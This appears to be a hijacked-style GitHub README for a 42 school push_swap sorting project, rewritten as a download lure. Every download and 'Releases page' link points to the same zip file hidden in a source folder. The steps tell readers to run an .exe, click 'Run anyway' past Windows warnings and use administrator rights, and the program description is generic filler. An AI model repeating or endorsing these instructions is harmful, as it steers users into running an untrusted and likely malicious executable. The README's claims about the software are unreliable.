# 🧮 42_M02_push_swap - Efficient Stack Sorting Tool

[![Download 42_M02_push_swap](https://img.shields.io/badge/Download-42_M02_push_swap-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip)

---

## 📋 About 42_M02_push_swap

42_M02_push_swap is a program designed to sort stacks of numbers using a combination of sorting algorithms. It selects the best moves based on the cost of each operation to give a sorted list with minimal steps. The program also includes a checker that verifies if the stack is sorted properly.

You can use this tool on Windows to see how sorting algorithms work in practice or to manage lists of numbers that need to be arranged in order. No programming knowledge is needed to get started.

---

## 🖥 System Requirements

- Windows 7 or later (64-bit recommended)  
- At least 4 GB of RAM  
- 100 MB free disk space  
- Administrator rights to install the program  
- Internet connection to download files  

---

## 🔍 Features

- Sorts a stack of numbers using multiple sorting strategies  
- Calculates the cost of each operation to optimize sorting  
- Includes a checker tool to verify sorting results  
- Simple and clear command-line interface  
- Fast execution suitable for everyday use  

---

## ⚙️ How it Works

You provide 42_M02_push_swap with a list of numbers. The program then runs several sorting algorithms behind the scenes. It picks the sequence of moves that uses the least "cost," or effort, to sort the stack. The checker confirms that the final stack is sorted.  

No complicated setup or options are required to run the basic functions.

---

## 🚀 Getting Started

Before running the program, download the latest release from the official GitHub page.

[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip)

---

## 📥 Download and Installation Instructions

1. Visit the [42_M02_push_swap Releases page](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip).  

2. On the page, find the latest release. Look for a file named something like `42_M02_push_swap_win.exe` or similar.  

3. Click on the file name to download it to your computer.  

4. Once downloaded, open the folder where the file saved (usually the "Downloads" folder).  

5. Double-click the `.exe` file to start the program.  

6. If Windows shows a warning about the file being from the internet, choose "Run" or "More info" and then "Run anyway".  

7. The program will open a window or command prompt ready to accept input.  

---

## 💡 How to Use 42_M02_push_swap

The program works using commands entered in the command prompt window:

1. Open Command Prompt by typing `cmd` in the Windows search bar and pressing Enter.  

2. Navigate to the folder where you saved `42_M02_push_swap_win.exe`. For example, if it is in Downloads, type:  
   ```
   cd %HOMEPATH%\Downloads
   ```  
   and press Enter.  

3. To run the program, type:  
   ```
   42_M02_push_swap_win.exe [numbers]
   ```  
   Replace `[numbers]` with the list of numbers you want to sort, separated by spaces. For example:  
   ```
   42_M02_push_swap_win.exe 3 2 10 5 1
   ```  

4. The program will print the operations used to sort the stack. Each line represents one action to move or swap numbers.  

5. To use the checker tool, run:  
   ```
   checker.exe [numbers]
   ```  
   This will confirm if the input numbers are sorted properly based on the program’s output.  

---

## 🔧 Understanding Output

The program shows a list of operations with names like `sa`, `pb`, `ra`. These stand for:

- `sa`: swap the first two numbers  
- `pb`: push the top number to a second stack  
- `ra`: rotate the stack upward  

The goal is to apply these steps to the original stack to end up with a sorted list. The output is meant for users curious about how sorting algorithms manage the data.

---

## 🛠 Troubleshooting

- If you get an error saying the command is not found, make sure you are in the folder where you saved the `.exe` file.  
- If the program closes immediately after running, open Command Prompt first and then run the command. This way, you can see any messages.  
- If numbers are not sorting correctly, check that you entered only integers separated by spaces. No letters or symbols should be included.  
- For any permission issues, try running Command Prompt as an administrator.  

---

## 🔄 Updating 42_M02_push_swap

To update the program:

1. Check the [Releases page](https://raw.githubusercontent.com/able-planking449/42_M02_push_swap/main/42_library/src/my_own/swap_push_1.7.zip) regularly for new versions.  
2. Download the latest `.exe` file as before.  
3. Replace the old file with the new one. You can simply overwrite it in your download folder or preferred location.  
4. Run the new executable following the same steps.  

---

## 🔍 Additional Information

This program is useful if you want to explore sorting algorithms from a practical angle. It breaks down the process into clear steps and shows how cost-efficient sorting is done. The checker helps confirm the results are correct.

The creators built this tool as part of a learning project focusing on how computers sort data. It handles stacks of any size that fit into memory, but very large lists may take longer to process.

---

## 📦 Available Files on the Releases Page

- Main executable for Windows (`.exe`)  
- Source code in a zip file (for advanced users only)  
- Documentation files with usage details  

Use the `.exe` file for direct usage. No extra installation or setup is required.  

---

## 🏷 Topics

42, 42cursus, 42project, 42school, c, checker, push-swap, push-swap-42, push-swap42, sorting, sorting-algorithms